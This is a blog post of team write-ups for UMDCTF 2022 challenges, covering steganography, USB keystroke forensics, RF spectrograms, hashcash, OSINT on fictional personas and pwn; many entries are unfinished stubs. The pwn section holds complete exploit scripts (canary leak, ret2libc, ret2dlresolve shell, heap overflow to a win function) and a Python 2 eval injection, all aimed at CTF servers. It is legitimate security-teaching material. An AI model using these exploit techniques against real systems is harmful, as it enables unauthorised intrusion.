---
layout: post
category: writeups
title: "UMDCTF 2022"
date: 2022-03-07
head_message: "These are our writeups for the challenges presented in this year's <a href=\"https://umdctf.io\">UMDCTF</a>."
head_ctf_categories:
  - crypto
  - forensics
  - hw/rf
  - misc
  - osint
  - pwn
  - rev
  - web
---

# Sources

Sources and other assets will be available shortly in the [official repo](https://github.com/UMD-CSEC/UMDCTF-Public-Challenges/tree/main/UMDCTF2022).

---

# Crypto

## MTP

> _One-time pad? More like multiple-time pad ;)_<br>
> _Attachments: encrypt.py, ciphertexts.txt_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## snowden

> _Eddy is sending encrypted messages out, but we can't quite figure out what he is saying._

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

---

# Forensics

## Blue

> _Larry gave me this python script and an image. What is she trying to tell me?_<br>
> _Attachments: bluer.png, steg.py_

We are given the image bluer.png (apparently completely blue) and a python script. Let's take a look at the script:

{:.linenumber}
```python:steg.py
from PIL import Image
import random

filename = 'blue.png'
orig_image = Image.open(filename)
pixels = orig_image.load()
width, height = orig_image.size

with open('flag.txt', 'r') as f:
    flag = f.read().strip()

for y in range(len(flag)):
    for a in range(ord(flag[y])):
        x = random.randrange(0, width - 1)
        c = random.randrange(0, 3)
        pixel = list(orig_image.getpixel((x, y)))
        pixel[c] += 1
        pixels[x, y] = (pixel[0], pixel[1], pixel[2])

orig_image.save('bluer.png')
```

It read the flag from a file, and then it uses it to modify the image blue.png. In particular for each row of pixels
of the image it increases by one, for n times, the value of one of the three channels (randomly chosen) of one pixel in
the row (randomly chosen). The number n is the ascii decimal value of one character of the flag; the same operation 
is executed for l times, where l is the length of the flag. For example: if the i_th char of the flag is _'a'_, the
i_th row of pixels of the image is considered and for 97 times (decimal value of a) random pixels are changed in the
way explained previously.

Analysing the image bluer.png we can see that almost all the pixels have the channels values [34, 86, 166] so
each variation wrt these values means that the corresponding pixel has been modified. We can check how many
variations there are for each row to recover the flag.

![blue](/assets/img/UMDCTF_2022/blue_bluememe.gif){: .half-width }

Script:

{:.linenumber}
```python:solve.py
from PIL import Image

orig_image = Image.open('bluer.png')
width, height = orig_image.size
flag = []
for y in range(60):
    count = 0
    for x in range(width):
        pixel = list(orig_image.getpixel((x, y)))
        if pixel[0] != 34:
            count += (pixel[0] - 34)
        if pixel[1] != 86:
            count += (pixel[1] - 86)
        if pixel[1] != 166:
            count += (pixel[2] - 166)
    flag.append(count)
    print(pixel)
print(''.join([chr(i) for i in flag]))
```

üèÅ _UMDCTF{L4rry_L0v3s_h3r_st3g0nogr@phy_89320}_{: .spoiler}


## How to Breakdance

> _My friend ctf\_playah has been learning to breakdance, can you find his youtube password? Upon submission, wrap his password with UMDCTF{}._

We are provided with a .pcapng file that contains USB traffic. Based on previous experience on similar challenges, I
decided to check if in the capture there was some USB **keyboard traffic**. Opening the capture in wireshark and
applying a simple filter we can actually see what seems to be keyboard traffic:

![usb](/assets/img/UMDCTF_2022/breakdance_usb.png){: .image-full }

In order to get the text written in the usb communication I used the tool
ctf-usb-keyboard-parser (https://github.com/carlospolop-forks/ctf-usb-keyboard-parser). As specified by the tool doc I
executed:

{:.linenumber}

```shell
tshark -r ./usb.pcap -Y 'usb.capdata && usb.data_len == 8' -T fields -e usb.capdata | sed 's/../:&/g2' > keystrokes.txt
python3 usbkeyboard.py ./keystrokes.txt
```

The text extracted was:

```text
best breakdancing vidwos ‚å´‚å´‚å´‚å´eos on the iternt‚å´et ‚å´
hoo to lean breakdancing in one day
ctf_playah
<flag_appears_here>
‚å´‚å´https://www.youtube.com/watch?v=7j5-u7hS0fs
This is it!The tutorial Ihave been waitinf for ‚å´‚å´‚å´‚å´‚å´‚å´g for my whole life!
```

üèÅ _UMDCTF{1_luv_70_f1nd_c7f_fl46s}_{: .spoiler}

## jdata

> _no shade... but also..._<br>
> _Attachments: jdata.zip_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## Magic Plagueis the Wise

> _Did you ever hear the tragedy of Darth Plagueis The Wise? It's written here in a magical way, but I can't figure out how to read it. Can you help me?_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## Renzik's Case

> _My friend deleted important documents off of my flash drive, can you help me find them?_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## Xorua

> _When Fred put his Zorua in the Driftveil City Pokecenter's PC something a bit strange happened. Can you help him figure out what happened?_<br>
> _Attachments: After.png, Before.png_

In this challenge we have two images, named _Before.png_ and _After.png_. The name of the challenge is a clear hint that
make think about the XOR operation. So I checked the first bytes of the _After.png_ file:

![xorua](/assets/img/UMDCTF_2022/xorua_hex.png)

The first bytes, the png header, are all zero. This supports the XOR hypothesis because the xor of the two images would
give another image (png header xored with 0 keep the png header). Making the xor betweeen _Before.png_ and _After.png_
gives us an image with the flag.

{:.linenumber}
```python:solve.py
from pwn import *

with open('Before (1).png', 'rb') as before:
    content = before.read()

with open('After (1).png', 'rb') as after:
    content2 = after.read()

res = xor(content, content2)

with open('flag.png', 'wb') as flag:
    flag.write(res)
```

üèÅ _UMDCTF{Sh4p3Sh1ft3R}_{: .spoiler}

---

# HW/RF

## Gee, queue are ex?

> _Oh the wonderful world of radio frequency.. what can you see?_<br>
> _Attachments: painter.iq_

This challenge was giving out some nice hints that a modern amateur radio operator could pick up quite easily:

+ The name of the challenge itself was wordplay on [GQRX](https://gqrx.dk/), a known [SDR](https://en.wikipedia.org/wiki/Software-defined_radio) interface, and probably the QRX acronym (see [Q Code](https://en.wikipedia.org/wiki/Q_code)) itself.
+ Judging by its extension, the attached file could have been raw [I/Q data](https://www.pe0sat.vgnet.nl/sdr/iq-data-explained/). _(Funnily enough, `file` was spitting out `painter.iq: OpenPGP Public Key`)_

Converting the raw data into audio and piping it through `sox` by fiddling with the arguments to get a readable spectrum would have been boring - _nonchalantly sweeps shell history file under the rug_ - and thus the occasion was perfect to pretend to know exactly what each GNURadio block does.

![GNURadio project](/assets/img/UMDCTF_2022/geequeueareex_gnuradio.jpg)

With some slight processing (skipping the initial junk present at the start of the stream, filtering the part of the spectrum that has interesting contents, playing with the sample rate due to the absence of hardware flow control) it became evident that the flag was being painted on the waterfall character by character.

![GNURadio GUI](/assets/img/UMDCTF_2022/geequeueareex_gnuradio.gif)

With that knowledge, a proper spectrogram could be generated:

```plaintext
sox -t raw -r 500000 -e float -b 32 painter.iq -n trim 189 1157 rate 100k spectrogram -X 6
```

![Spectrogram](/assets/img/UMDCTF_2022/geequeueareex_spectrogram.jpg)

After the CTF ended, the admins confirmed that the signal had been partially generated with [spectrum_painter](https://github.com/polygon/spectrum_painter) and, to introduce some realistic fading and noise, transmitted and re-recorded with an RTL-SDR and an HackRF. Clever!

üèÅ __UMDCTF{D15RUP7_R4D1OZ}__{:.spoiler}

## Bongo cat

> _do u even use dvorak u dweeb. i only hav 8 keys on my keyboard and i type at 12000 wPM. i bet u even look at ur hands when u type. i haven't looked at my hands ever._<br>
> _Attachments: bongo-cat.hex_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## Minetest 1 - Digital Logic Primer

> _Join the server to checkout the minetest challenges. You do not need to solve one before the other!_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## Minetest 2 - MUX

> _Join the server to checkout the minetest challenges. You do not need to solve one before the other!_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

---

# Misc

## Blockchain 1 - Hashcash

> _Gary has an email service, but he hates spammers, so he implemented Hashcash._

Connecting to the challenge we receive this:

```
Welcome to Gary's email service. Gary has setup Hashcash because we've been getting a lot 
of emails lately. He said something about bitcoin and blockchain, but all that mumbo jumbo 
doesn't make sense to me. He said you should get a confirmation message after passing the 
Hashcash mechanism. 

ver = 1  
leading zero bits = 20
date format = YYMMDD

Here is a list of the emails on our network:
- gary@hashcash.com           - cheshirecatalytic@hashcash.com
- birch@hashcash.com          - dewy@hashcash.com
- shricubed@hashcash.com      - triakontakai@hashcash.com
- wittsend2@hashcash.com      - artemis19@hashcash.com
- jsfleming@hashcash.com      - mykale@hashcash.com
- amanthanvi@hashcash.com     - ptrip9199@hashcash.com
- ishaan514@hashcash.com      - mmohades@hashcash.com
- angcheng27@hashcash.com     - suryaviyyapu@hashcash.com
- nickfroehl@hashcash.com     - yieb@hashcash.com
- cybercyber2@hashcash.com    - sm00thcriminal96@hashcash.com
- ai-ya-ya@hashcash.com 

Would you like to send an email (y/n)? 
y   <-- our input
X-Hashcash:
```

We are provided a link, https://en.wikipedia.org/wiki/Hashcash, that explain the hashcash proof-of-work system. The
X-Hashcash refers to the hashcash header that should be of this type:

X-Hashcash: 1:20:1303030600:anni@cypherspace.org::McMybZIhxKXu57jd:ckvi

In the wiki page provided we can found explanation of each field (: separated):
* ver: Hashcash format version, 1 (which supersedes version 0).
* bits: Number of "partial pre-image" (zero) bits in the hashed code.
* date: The time that the message was sent, in the format YYMMDD[hhmm[ss]]. <-- valid if within two days of the current date
* resource: Resource data string being transmitted, e.g., an IP address or email address.
* ext: Extension (optional; ignored in version 1).
* rand: String of random characters, encoded in base-64 format.
* counter: Binary counter, encoded in base-64 format.

In order to create a valid message the sender prepares a header and appends a counter value 
initialized to a random number. It then computes the 160-bit SHA-1 hash of the header. 
If the first 20 bits (i.e. the 5 most significant hex digits) of the hash are all zeros, 
then this is an acceptable header. If not, then the sender increments the counter and tries the hash again.
The only thing that we can try is to create a valid message to one of the provided mails. The only criteria we 
need to respect are:
* Use a valid date: within two days of the current date
* The 5 most significant hex digits have to be 0
* The mail is registered in the network

Such a string is easy to create, and the server after receiving and checking the hashcash gives us the flag.

![moon](/assets/img/UMDCTF_2022/hashcash_tothemoon.gif){: .half-width }

Script:

{:.linenumber}
```python:solve.py
import base64
from Crypto.Hash import SHA1

count = 0
while True:
    h = SHA1.new()
    hashcash = '1:20:220305:gary@hashcash.com::McMybZIhxKXu57jd:'
    countb64 = base64.b64encode(str(count).encode())
    h.update(hashcash.encode() + countb64)
    print(h.hexdigest())
    if h.hexdigest()[:5] == '00000':
        print(hashcash.encode() + countb64)
        break
    count += 1
```

üèÅ _UMDCTF{H@sh_c4sH_1s_th3_F@th3r_0f_pr00f_0f_w0rk}_{: .spoiler}

## Blockchain 2 - ChungusCoin

> _Chungus Coin is a PoW blockchain that holds indefinite value. There is a reward for those who mine!_<br>
> _NOTE: The PoW required for this blockchain is {p0}{p1} s.t._<br>
> `p0 = proof of previous block`<br>
> `p1 = proof of block being created`<br>
> `sha256(f'{p0}{p1}')\[:5] == '00000'`

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## ChungusBot v2

> _Check out my code!_

In this challenge we have to interact with the discord bot _ChungusBot v2_.
As suggested by the challenge description we need to search the source code of the bot. It can be easily found
on github, in this UMDSEC repo: https://github.com/UMD-CSEC/ChungusBot_v2. We can see  from the code that every command of the bot starts 
with "_Oh Lord Chungus please_ " and in particular we are interested in the command "_tellme theflag_". The bot
tells us the flag only if we pass 2 checks:

{:.linenumber}
```python
def check2(hmm):
    something = int(hmm.split(':')[-1].split('.')[0])
    if (something > 45 and something < 50) or (something > 14 and something < 19):
        return True
    return False

def check1(av):
    r = requests.get(str(av), stream = True)
    if r.status_code == 200:
        r.raw.decode_content = True
        filename = str(str(av).split("/")[-1].split('?')[0])
        path = f'./downloaded_files/{filename}'
        with open(path,'wb') as f:
            shutil.copyfileobj(r.raw, f)
    else:
        return False, "Could not grab your pfp for some reason"

    img1 = list(Image.open('chungus_changed.jpg').convert("1").getdata())
    img2 = list(Image.open(path).convert("1").getdata())
   
    os.system(f"rm {path}")
    
    bigger = len(img1)
    if bigger > len(img2):
        bigger = len(img2)

    try:
        count = 0
        for i in range(bigger):
            if img1[i] == img2[i]:
                count += 1
    except:
        return False, "Image size not the same"

    message = "Percentage of pixels correct: " + str(count / len(img1))
    if count / len(img1) > 0.92:
        return True, message
    elif count / len(img1) > 0.6:
        return False, message
    else:
        return False, f"Images are not the same ({100 * count / len(img1)}%)"
```

Check1 verifies that our profile picture on Discord is at least 92% equal to the bot's one. In order to pass this
check we can use the command "_tellme avatar_" which gives us the following image.

![chungus_mod](/assets/img/UMDCTF_2022/chunga_diff.jpg){: .half-width }

The image correspond to the bot's picture but it's modified. With not so much effort we can adjust it, using Gimp, to pass the
check.

![chungus_ok](/assets/img/UMDCTF_2022/chunga_orif.jpg){: .half-width }

After setting the right profile picture we only have to pass check2, sending the command at a time hh:mm:ss such that the 
seconds ss are in the ranges 15-18 or 46-49.

üèÅ __UMDCTF{Chungus_15_wh0_w3_str1v3_t0_b3c0m3}__{:.spoiler}

## RSI 1

> _A friend of mine left me a mysterious file from a game he was playing._<br>
> _Attachments: tutorial.osr_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## RSI 2

> _I got addicted to the game, and my friend left me another one of his cool replays._<br>
> _Attachments: big\_b.osr_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

---

# OsInt

## Justina 1

> _After Justin's adventure in Russia, his sister, Justina Zimmerman has scurried off somewhere and we need to find her. There must be a way to see what she has been up to. Justin might even be able to help us._

The challenge gives us a photo and little information about Justina Zimmerman: she has scurried off somewhere, she has 3 social
profiles and she has a brother called Justin. The first thing we did is searching justina zimmerman on google. The first
result was Justina Facebook account (https://www.facebook.com/profile.php?id=100077345730858)

![justina](/assets/img/UMDCTF_2022/justina_justinaFB.png){: .image-full }

The profile contains more info about justina: she just graduated from university of Maryland and she decided to 
take a trip. There is also a link to a private group with this description.

_I like to tell people what I'm up to here. I felt like taking a spontaneous trip :)
ONLY FRIENDS AND FAMILY! My mods will only accept people who prove they know me. 
Any bad requests will be denied or automatically tossed if some questions were not answered._

To prove we knew Justina we had to answer 3 questions:

1) **How do you know Justina?** 


2) **What is Justina's favorite TV show?**
* Friends
* Game of Thrones
* Silicon Valley
* The Office
* Vampire Diaries

3) **Who is Justina's favorite artist?**
* Taylor Swift
* Justin Bieber
* Harry Styles
* Ed Sheeran
* The Weeknd

We could answer to first question (we met her at university of Maryland) but unfortunately on facebook there was no more useful information, so we needed to find the other two profiles. After
**_a lot_** of researches, on every existing social media, we couldn't find anything. Probably Justina Zimmerman wasn't
the right username. Therefore, we decided to search Justin, Justina's brother. We easily found him on Facebook too (https://www.facebook.com/justin.zimmerman.54943).

![justin](/assets/img/UMDCTF_2022/justina_justinFB.png){: .image-full }

Most of the information was related to the 2021 edition of UMDCTF, but we noticed something interesting. Justin's 
nickname was _Justin Zimmerman (Zimmy Boi)_. Since the challenge description told us Justin would have helped us
we tried to search Justina Zimmy. Bingo! We found the two  remaining accounts on instagram and twitter 
(https://www.instagram.com/justinazimmy/ & https://twitter.com/justinazimmy). On these accounts we found the
info on Justina's favourite singer and favourite tv show, respectively Justin Bieber and The Vampires Diary. With 
all the info gathered we could enter Justina's private facebook group. The first post on the group is an event called
"_Meetup @ my place_",whose description contained the flag.

üèÅ _UMDCTF{w3lc0me_t0_th3_l1f3_0f_Just1n@}_{: .spoiler}

## Justina 2

> _Can you figure out which city Justina has been staying in? Hopefully we can find her soon!_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## Justina 3

> _I think Justina is going to another place! I can't keep up with her. Help me find her._

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## Justina 4

> _I've been chatting with Justina as she travels, and she is settling down with her french boyfriend. They are even having a kid! I want to send her a baby shower gift but I don't know what to get her... She told me there is some online registry for gifts but it's under her boyfriends name. Can you find the registry online?_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## ketchup

> _I took a picture with this guy a few years ago but I forgot his name! Can you tell me who he is?_<br>
> _Attachments: ketchup.png_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## Outdoors 1

> _My friend Jason Heyson recently got into live-streaming. He's been streaming a place in his hometown, but he won't give me the link! It must be related to the environment, the outdoors, or real life given my current context. Can you find his stream for me?_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## Outdoors 2

> _Thank you for finding the livestream. It looks like Jason must have moved because I do not recognize the the place he is streaming at all! Can you give me the address of the orangeish building on the live stream?_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## Unaccounted For Co-Worker

> _Help! My co-worker hasn't showed up to work for the past week and my boss wants me to find out where he went. I know that he took an American Airlines flight from the "Mile High City" to the city with the largest historic theatre district on February 24th. A couple days later, I heard he took a train northwest 8 stops from Union Station. Can you tell me the aircraft type and the final destination city?_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

---

# Pwn

## Classic Act

> _Pwning your friends is a class act. So why not do it to some random server?_<br>
> _Attachments: classicact_

In this challenge we are given the unstripped 64-bit binary _classicat_. The checksec command reveals that all the 
protections except the PIE are active. After decompiling with ghidra we find out that the main contains the vuln 
function, which has the following decompiled code:

{: .linenumber}
```c
bool vuln(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char name [16];
  char like [72];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Please enter your name!");
  gets(name);
  puts("Hello:");
  printf(name);
  putchar(10);
  puts("What would you like to do today?");
  gets(like);
  iVar1 = strncmp(like,"Play in UMDCTF!",0xf);
  if (iVar1 != 0) {
    puts("Good luck doing that!");
  }
  else {
    puts("You have come to the right place!");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return iVar1 != 0;
}
```

There are clearly 2 vulnerabilities in this code: the format string vulnerability in _printf(name)_ and the buffer
overflow on _gets_. Exploiting these vulnerabilities we can do almost whatever we want, so the challenge seems to be a 
**_classic_ ret2libc** attack.

The first thing to do is to leak the canary to fully exploit the buffer overflow, the format string helps us with that.
Watching the stack with pwndbg we can see this:

![stack](/assets/img/UMDCTF_2022/classic_act_stack.png){: .image-full }

With a few tests we can easily find that the canary is 0x58 bytes from our controlled input and we can leak it through 
printf with _printf('%19$lx')_. 

After leaking the canary we also need to find the right libc used remotely for the binary. Again we can do this
by leaking libc pointers with the format string. From the stack we can check the libc symbols related to each pointers.
We can try to find the right libc online using the leaks (_IO_file_jumps, _IO_2_1_stdout_, setbuffer ...). At this point 
of the exploit I struggled **a bit** while searching the libc because https://libc.blukat.me/ wasn't giving the right
results. Me _patiently_ searching libc:

![rage](/assets/img/UMDCTF_2022/classic_act_rage.gif){: .half-width }

Then I tried with https://libc.rip/ and I found the right result: libc6_2.31-0ubuntu9.7_amd64.so. After that, thanks to
one_gadget (https://github.com/david942j/one_gadget), all the work was done, the rest is the python script.

{:.linenumber}
```python:solve.py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./_classicact")
libc = ELF("libc.so.6")
context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript='b vuln')
    else:
        r = remote("0.cloud.chals.io", 10058)

    return r


def ret2dlres(r):
    dlresolve = Ret2dlresolvePayload(exe, symbol="system", args=["sh"])
    rop = ROP(exe)
    ret = rop.find_gadget(['ret'])[0]
    rop.raw(ret)
    rop.gets(dlresolve.data_addr) 
    rop.ret2dlresolve(dlresolve)
    r.sendlineafter(b'!\n', b'%19$lx')
    r.recvline()
    canary = int(r.recv(16), 16)
    log.info(f'canary: {hex(canary)}')
    payload = b'a' * 72 + p64(canary) + b'a' * 8 + rop.chain() + b'\n' + dlresolve.payload
    r.sendlineafter(b'?\n', payload)


def ret2libc(r):
    # leak canary and libc pointer
    r.sendlineafter(b'!\n', b'%19$lx%12$lx')
    r.recvline()
    canary = int(r.recv(16), 16)
    leak = int(r.recv(12), 16)
    # compute libc base address
    libc.address = leak - libc.sym._IO_2_1_stdout_
    print(hex(libc.address))
    # one_gadget found from command line
    one_gadget = p64(libc.address + 0xe3b31)
    r.sendlineafter(b'?\n', b'a' * 72 + p64(canary) + b'a' * 8 + one_gadget)


def main():
    r = conn()
    ret2libc(r)
    # ret2dlres(r)
    r.interactive()


if __name__ == "__main__":
    main()
```

As you can see there is also another exploit in the script. After I solved the challenge I wondered if there 
was another method that didn't involve finding the right libc. After a short search I realized that ret2dlresolve 
was what I needed. Here some references about it: https://docs.pwntools.com/en/stable/rop/ret2dlresolve.html, 
https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve .

üèÅ _UMDCTF{H3r3_W3_G0_AgAIn_an0thEr_RET2LIBC}_{: .spoiler}


## Legacy

> _Fred just won‚Äôt keep up with the times. Why don't you show him the error of his ways?_

This challenge don't have attachments, so the only thing we can do is to connect to the given address. 

```text
I bet you can't guess my *secret* number!
I'll give you hint, its between 0 and 0,1000000000000000514!
```

The program asks us to guess a secret number. Let's try to play fairly:

```text
0,1     <-- our input1
0,01    <-- our input2
0,001   <-- our input3
3 chances left! 
2 chances left! 
1 chances left! 
Deprecated shmeprecated!
Python 2 will never die!
```

Ok we couldn't guess correctly. At the end we receive also a strange message referring to python2 deprecation, maybe
this will be useful. Now we can try non-numerical inputs:

```text
I bet you can't guess my *secret* number!
I'll give you hint, its between 0 and 0,1000000000000000514!
a   <-- our input
3 chances left! 
Traceback (most recent call last):
  File "/home/ctf/legacy.py", line 15, in <module>
    if (input(str(3-i) + " chances left! \n") == secret):
  File "<string>", line 1, in <module>
NameError: name 'a' is not defined
```

Interesting. We receive a python error message, which tell us that our input taken with the _input()_ function
is compared to the variable secret. It also says that _'a'_ is not defined. This happens because in Python 2.x, 
the input() function is equivalent to eval(raw_input), so the script can read user input into a variable. Fortunately
we know the name of the secret variable:

```text
I bet you can't guess my *secret* number!
I'll give you hint, its between 0 and 0,1000000000000000514!
secret
3 chances left! 
No way!
UMDCTF{**_**_*******}
```

üèÅ _UMDCTF{W3_H8_p7th0n2}_{: .spoiler}

## The Show Must Go On

> _We are in the business of entertainment, the show must go on! Hope we can find someone to replace our old act super fast..._<br>
> _Attachments: theshow_

We are given a 64-bit not-stripped binary. Checksec reveals this protections:

```shell
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
```

We can firstly take a look at the code decompiled with ghidra. The binary contains a _huge_ number of functions, that is both strange and suspect.
The most important are:

* main

{: .linenumber}
```c
void main(void)
{
  int iVar1;
  
  setbuf((FILE *)stdout,(char *)0x0);
  setbuf((FILE *)stdin,(char *)0x0);
  setbuf((FILE *)stderr,(char *)0x0);
  setup();
  iVar1 = whatToDo();
  if (iVar1 != 0) {
    puts("The show is over, goodbye!");
  }
  return;
}
```

The main function seems pretty clear, let's examine the 2 functions setup and whatToDo:

* setup

{: .linenumber}
```c
undefined8 setup(void)

{
  long in_FS_OFFSET;
  int desc_length;
  char *crypt_result;
  undefined act_name [40];
  long local_10;
  undefined8 *strings;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  crypt_result = (char *)0x0;
  desc_length = 0;
  message1 = (undefined8 *)malloc_set(0x50);
  message2 = (undefined8 *)malloc_set(0x60);
  message3 = (undefined8 *)malloc_set(0x80);
  strings = message1;
  *message1 = 0x20656d6f636c6557;
  strings[1] = 0x6320656874206f74;
  strings[2] = 0x6c63207964656d6f;
  *(undefined4 *)(strings + 3) = 0xa216275;
  strings = message2;
  *message2 = 0x20796c6e6f206557;
  strings[1] = 0x6568742065766168;
  strings[2] = 0x6f63207473656220;
  strings[3] = 0x20736e616964656d;
  *(undefined4 *)(strings + 4) = 0x65726568;
  *(undefined *)((long)strings + 0x24) = 0x21;
  strings = message3;
  *message3 = 0x6820657361656c50;
  strings[1] = 0x7320737520706c65;
  strings[2] = 0x6f66207075207465;
  strings[3] = 0x612072756f792072;
  *(undefined4 *)(strings + 4) = 0xa7463;
  printf("%s",message1);
  printf("%s",message2);
  printf("%s",message3);
  puts("What is the name of your act?");
  __isoc99_scanf(&DAT_004bb1e6,act_name);
  mainAct = malloc_set(0x68);
  nop(mainAct,act_name,0x20);
  crypt_result = crypt("Main_Act_Is_The_Best",salt);
  nop(mainAct + 0x20,crypt_result,0x40);
  puts("Your act code is: Main_Act_Is_The_Best");
  *(code **)(mainAct + 0x60) = tellAJoke;
  currentAct = mainAct;
  free(message1);
  free(message3);
  puts("How long do you want the show description to be?");
  __isoc99_scanf(&%d,&desc_length);
  showDescription = (char *)malloc_set((long)(desc_length + 8));
  puts("Describe the show for us:");
  getchar();
  fgets(showDescription,500,(FILE *)stdin);
  actList._0_8_ = mainAct;
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

* whatToDo

{: .linenumber}
```c
undefined4 whatToDo(void)

{
  long in_FS_OFFSET;
  int local_18;
  undefined4 local_14;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("What would you like to do?");
  local_18 = 0;
  local_14 = 0;
  puts("+-------------+");
  puts("|   Actions   |");
  puts("|-------------|");
  puts("| Perform Act |");
  puts("| Switch Act  |");
  puts("| End Show    |");
  puts("+-------------|");
  printf("Action: ");
  __isoc99_scanf(&%d,&local_18);
  if (local_18 == 2) {
    switchAct();
    puts("I think the current act switched switched. It might appear when we start up again...");
  }
  else {
    if (local_18 == 3) {
      local_14 = 1;
    }
    else {
      if (local_18 == 1) {
        (**(code **)(currentAct + 0x60))();
      }
    }
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return local_14;
}
```

Although the setup functions is a bit messy we can understand the overall behavior of the binary. Initially we are asked to give in input the name of our 
act (0x68 bytes allocated). After that are executed a few useless operation (like crypt) and at main+0x60 is assigned a pointer to the function tellAJoke. Then we are asked the length of the act's description, but independently of our input the program receives 500 bytes through the fgets functions: 
this is a clear buffer overflow vulnerability. The function what to do simply allow us to perform our act, executing the function pointed by 
main+0x60 which normally is tellAJoke, or to switch our act with another. 

Once we understood the behavior of the program it's easy to spot the 
vulnerability: through a heap overflow (possible since we choose desc_length) we can overwrite the pointer in main act and execute every function
we want. At this point I naively thought: "It would be perfect if we had a function like _printFlag_ or _popShell_". While I was absorbed in thoughts
I realized that maybe the big amount of functions of the binary, previously mentioned, was used to hide such a "magic" function. It turned out
that I was correct and with a brief search I found the _win()_ function that print the flag. The rest of the exploit simply consist in gdb checks in order
to find offsets for the overflow.

Script:

{:.linenumber}
```python:solve.py
#!/usr/bin/env python3

from pwn import *

exe = ELF("./theshow")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    elif args.GDB:
        r = gdb.debug([exe.path], gdbscript='''b main''')
    else:
        r = remote("0.cloud.chals.io", 30138)
    return r


def main():
    r = conn()
    r.sendlineafter(b'act?\n', b'born2scan')
    r.sendlineafter(b'be?\n', b'120')
    # heap overflow
    r.sendlineafter(b'us:\n', b'a' * 240 + p64(exe.sym.win))
    r.sendlineafter(b'Action: ', b'1')
    print(r.recvline().decode())


if __name__ == "__main__":
    main()
```

üèÅ _UMDCTF{b1ns_cAN_B3_5up3r_f4st}_{: .spoiler}

---

# Rev

## DragonPit

> _Fred is trying to learn how to deal with dragons. Can you help him out?_<br>
> _Attachments: dragonPit_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## tiny

> _Scan for free crypto currency!_<br>
> _Attachments: tiny.png_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

---

# Web

## A Simple Calculator

> _Calc you later! :)_<br>
> _Attachments: A\_Simple\_Calculator.zip_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}

## Customer Support

> _Contact Devils customer supoprt and see what they have to offer._<br>
> _Attachments: Customer\_Support.zip_

// TODO: writeup

üèÅ __UMDCTF{...}__{:.spoiler}
